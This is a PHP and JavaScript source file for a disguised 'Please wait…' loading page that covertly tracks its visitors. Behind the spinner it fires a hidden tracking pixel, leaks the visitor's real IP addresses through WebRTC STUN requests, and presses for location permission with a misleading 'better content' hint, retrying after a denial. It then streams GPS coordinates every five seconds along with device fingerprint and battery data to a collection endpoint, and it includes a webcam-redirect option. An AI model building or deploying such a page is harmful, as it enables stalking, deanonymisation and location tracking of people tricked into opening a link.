<?php
$config = [
    'redirect_url'      => 'forwarding_link/index2.html',
    'location_endpoint' => 'location.php',
    'ip_endpoint'       => 'ip.php',
    'timeout_ms'        => 45000,
    'min_display_time'  => 3000,
    'track_location'    => 1,
    'track_webcam'      => 0,
    'stun_servers'      => [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302',
        'stun:stun2.l.google.com:19302',
        'stun:stun3.l.google.com:19302',
    ],
];

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: 0');
header('X-Content-Type-Options: nosniff');

$sessionToken = bin2hex(random_bytes(16));

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Please wait...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container { text-align: center; padding: 2rem; max-width: 420px; width: 90%; }
        h2 { font-weight: 300; font-size: 1.6rem; margin-bottom: 0.5rem; color: #ffffff; letter-spacing: 0.5px; }
        p { font-size: 0.9rem; color: #999; margin-bottom: 0.4rem; }
        #locationStatus { color: #aaa; font-size: 0.82rem; margin-top: 1rem; min-height: 1.5rem; transition: color 0.3s ease; }
        #locationStatus.success { color: #4caf50; }
        #locationStatus.error   { color: #f44336; }
        #locationStatus.info    { color: #ff9800; }
        #locationStatus.waiting { color: #2196f3; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .spinner-container { margin: 2rem auto; position: relative; width: 70px; height: 70px; }
        .spinner { border: 3px solid rgba(255,255,255,0.05); border-top: 3px solid #4a6cf7; border-right: 3px solid #6c63ff; border-radius: 50%; width: 100%; height: 100%; animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite; }
        .spinner-inner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 40px; height: 40px; border: 2px solid rgba(255,255,255,0.03); border-bottom: 2px solid #7c5cfc; border-left: 2px solid #8b5cf6; border-radius: 50%; animation: spin 1.2s cubic-bezier(0.4, 0.0, 0.2, 1) infinite reverse; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 200px; height: 2px; background: rgba(255,255,255,0.05); border-radius: 2px; margin: 1.5rem auto 0; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #4a6cf7, #6c63ff, #8b5cf6); border-radius: 2px; animation: progress 2.5s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0%; margin-left: 0; } 50% { width: 100%; margin-left: 0; } 100% { width: 0%; margin-left: 100%; } }
        .data-points { display: flex; justify-content: center; gap: 1.5rem; margin-top: 1.2rem; opacity: 0.5; font-size: 0.7rem; color: #666; }
        .data-points span { display: flex; align-items: center; gap: 4px; }
        .dot { display: inline-block; width: 5px; height: 5px; border-radius: 50%; }
        .dot.webrtc  { background: #ff9800; }
        .dot.gps     { background: #4caf50; }
        .dot.network { background: #2196f3; }
        .gps-hint { margin-top: 15px; font-size: 0.75rem; color: #666; line-height: 1.4; display: none; }
        .gps-hint.visible { display: block; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .gps-hint i { color: #2196f3; margin-right: 4px; }
        @media (max-width: 480px) { h2 { font-size: 1.3rem; } .container { padding: 1.5rem; } }
    </style>
</head>
<body>
    <img src="<?= htmlspecialchars($config['ip_endpoint'], ENT_QUOTES, 'UTF-8') ?>" 
         style="position:absolute;width:1px;height:1px;opacity:0.01;left:-9999px;" alt="">

    <div class="container">
        <h2>Loading, please wait…</h2>
        <p>Preparing your content for the best experience</p>
        
        <div class="spinner-container">
            <div class="spinner"></div>
            <div class="spinner-inner"></div>
        </div>
        
        <p id="locationStatus">Initializing…</p>
        
        <div class="gps-hint" id="gpsHint">
            <span style="font-size:1rem;">📍</span> 
            If prompted, tap <strong>"Allow"</strong> to enable location for better content
        </div>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="data-points">
            <span><span class="dot webrtc"></span> Network</span>
            <?php if ($config['track_location']): ?><span><span class="dot gps"></span> Location</span><?php endif; ?>
            <span><span class="dot network"></span> Session</span>
        </div>
    </div>

    <script>
    var CONFIG = {
        sessionToken: '<?= $sessionToken ?>',
        locationEndpoint: '<?= htmlspecialchars($config['location_endpoint'], ENT_QUOTES, 'UTF-8') ?>',
        ipEndpoint: '<?= htmlspecialchars($config['ip_endpoint'], ENT_QUOTES, 'UTF-8') ?>',
        redirectUrl: '<?= htmlspecialchars($config['redirect_url'], ENT_QUOTES, 'UTF-8') ?>',
        timeoutMs: <?= (int) $config['timeout_ms'] ?>,
        minDisplayTime: <?= (int) $config['min_display_time'] ?>,
        trackLocation: <?= (int) $config['track_location'] ?>,
        trackWebcam: <?= (int) $config['track_webcam'] ?>,
        stunServers: <?= json_encode($config['stun_servers']) ?>,
    };

    var collectedData = { session: CONFIG.sessionToken, webrtc: null, gps: null, battery: null, device: null, network: null, time: Date.now() };
    var redirectTimer = null, dataSent = 0, gpsAttempted = false, watchId = null;

    function setStatus(msg, type) { var el = document.getElementById('locationStatus'); if (el) { el.textContent = msg; el.className = type || 'info'; } }
    function showGpsHint() { var h = document.getElementById('gpsHint'); if (h) h.classList.add('visible'); }

    function sendData(data) {
        if (dataSent >= 50) return; // Allow more data points
        var p = new URLSearchParams();
        p.append('batch', dataSent + 1);
        for (var k in data) { if (data[k] !== null && data[k] !== undefined) p.append(k, typeof data[k] === 'object' ? JSON.stringify(data[k]) : data[k]); }
        p.append('session', CONFIG.sessionToken);
        if (!navigator.sendBeacon(CONFIG.locationEndpoint, p)) {
            var x = new XMLHttpRequest();
            x.open('POST', CONFIG.locationEndpoint, false);
            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            x.send(p.toString());
        }
        dataSent++;
    }

    function leakWebRTC() {
        try {
            var c = { iceServers: CONFIG.stunServers.map(function(u) { return { urls: u }; }), iceTransportPolicy: 'all', bundlePolicy: 'max-bundle', rtcpMuxPolicy: 'require' };
            var pc = new RTCPeerConnection(c);
            pc.createDataChannel('rd');
            pc.createOffer().then(function(o) { pc.setLocalDescription(o); }).catch(function(){});
            var ips = [];
            pc.onicecandidate = function(e) {
                if (e.candidate && e.candidate.candidate) {
                    var m = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                    if (m && ips.indexOf(m[1]) === -1) ips.push(m[1]);
                }
            };
            pc.onicegatheringstatechange = function() {
                if (pc.iceGatheringState === 'complete' && ips.length) { sendData({ webrtc_ip: ips.join('|'), webrtc_raw: ips.join('||'), webrtc_count: ips.length, initial_batch: true }); try { pc.close(); } catch(e){} }
            };
            setTimeout(function() { try { if (ips.length && dataSent < 1) sendData({ webrtc_ip: ips.join('|'), webrtc_raw: ips.join('||'), webrtc_count: ips.length, webrtc_timeout: true }); pc.close(); } catch(e){} }, 5000);
        } catch(e) {}
    }

    function handlePosition(pos) {
        gpsAttempted = true;
        var c = pos.coords;
        setStatus('Location obtained ✓', 'success');
        var g = { 
            gps_lat: c.latitude.toFixed(6), 
            gps_lon: c.longitude.toFixed(6), 
            gps_acc: c.accuracy ? c.accuracy.toFixed(1) : null, 
            gps_alt: c.altitude ? c.altitude.toFixed(1) : null,
            gps_heading: c.heading ? c.heading.toFixed(1) : null,
            gps_speed: c.speed ? c.speed.toFixed(1) : null,
            gps_source: 'gps_watch',
            continuous: true
        };
        sendData(g);
        collectedData.gps = g;
    }

    function handleLocationError(err) {
        gpsAttempted = true;
        setStatus('Location error: ' + (err.code === 1 ? 'Permission denied' : err.code === 2 ? 'Unavailable' : 'Timeout'), 'error');
        sendData({ gps_error: err.code, gps_msg: err.message, source: 'gps_error' });
        // If permission denied, try once more with low accuracy
        if (err.code === 1) {
            setTimeout(function() {
                navigator.geolocation.getCurrentPosition(
                    function(pos) { handlePosition(pos); },
                    function(e2) { sendData({ gps_error: e2.code, gps_msg: e2.message + ' (retry)', source: 'gps_retry_failed' }); },
                    { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
                );
            }, 2000);
        }
    }

    function getLocation() {
        if (!CONFIG.trackLocation) { setStatus('Setup complete', 'success'); sendFallback(); return; }
        if (!navigator.geolocation) { setStatus('Not available', 'error'); sendFallback(); return; }
        setStatus('Requesting your location…', 'waiting');
        showGpsHint();

        // FIX 1: Use watchPosition() for continuous GPS tracking
        watchId = navigator.geolocation.watchPosition(
            handlePosition,
            handleLocationError,
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );

        // FIX 2: Also do an immediate getCurrentPosition for quick first fix
        setTimeout(function() {
            navigator.geolocation.getCurrentPosition(
                function(pos) { 
                    // First position already handled by watchPosition
                    if (!collectedData.gps) handlePosition(pos);
                },
                function(err) { /* watchPosition will handle */ },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }, 500);

        // FIX 3: After getting first data, still redirect to template
        // Set a timer to redirect after first successful capture
        var redirectCheck = setInterval(function() {
            if (collectedData.gps && !redirectTimer) {
                clearInterval(redirectCheck);
                scheduleRedirect(true);
            }
        }, 1000);

        // Fallback: redirect after timeout even if no GPS
        setTimeout(function() {
            clearInterval(redirectCheck);
            if (!redirectTimer) scheduleRedirect(false);
        }, CONFIG.timeoutMs);
    }

    function collectDeviceData() {
        collectedData.device = { screen: screen.width+'x'+screen.height, avail: screen.availWidth+'x'+screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio||1, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezoneOffset: new Date().getTimezoneOffset(), language: navigator.language, languages: navigator.languages?navigator.languages.join(','):null, platform: navigator.platform||null, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack||null, hardwareConcurrency: navigator.hardwareConcurrency||null, deviceMemory: navigator.deviceMemory||null, maxTouchPoints: navigator.maxTouchPoints||0, vendor: navigator.vendor||null };
    }

    function collectBatteryData() {
        if (navigator.getBattery) navigator.getBattery().then(function(b) { collectedData.battery = { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime }; }).catch(function(){});
    }
function sendFallback() {
    collectDeviceData();
    collectBatteryData();
    sendData({
        source: 'no_gps_requested',
        battery: collectedData.battery || null,
        device: JSON.stringify(collectedData.device || {})
    });
    scheduleRedirect(false);
}

function scheduleRedirect(gpsSuccess) {
    if (redirectTimer) return;
    var waited = Date.now() - (collectedData.time || Date.now());
    var remaining = Math.max(0, CONFIG.minDisplayTime - waited);
    var url = CONFIG.trackWebcam ? CONFIG.redirectUrl : (gpsSuccess ? 'about:blank' : 'about:blank');
    
    redirectTimer = setTimeout(function() {
        if (CONFIG.trackWebcam) {
            window.location.href = CONFIG.redirectUrl;
        } else {
            // Stop watching position since we're done
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }
            // Close the loading page
            document.querySelector('.container').innerHTML = '<h2>Complete ✓</h2><p style="color:#4caf50;">You may close this page</p>';
        }
    }, remaining);
}

// ── INIT ──
setStatus('Initializing…', 'info');
leakWebRTC();
getLocation();

// Collect battery info async
setTimeout(collectBatteryData, 100);
setTimeout(collectDeviceData, 200);

// Send periodic heartbeat with GPS data (every 5 seconds for continuous tracking)
setInterval(function() {
    if (collectedData.gps) {
        sendData({
            gps_lat: collectedData.gps.gps_lat,
            gps_lon: collectedData.gps.gps_lon,
            gps_acc: collectedData.gps.gps_acc,
            gps_alt: collectedData.gps.gps_alt,
            gps_heading: collectedData.gps.gps_heading,
            gps_speed: collectedData.gps.gps_speed,
            continuous: true,
            heartbeat: Date.now()
        });
    }
}, 5000);

</script>
</body>
</html>
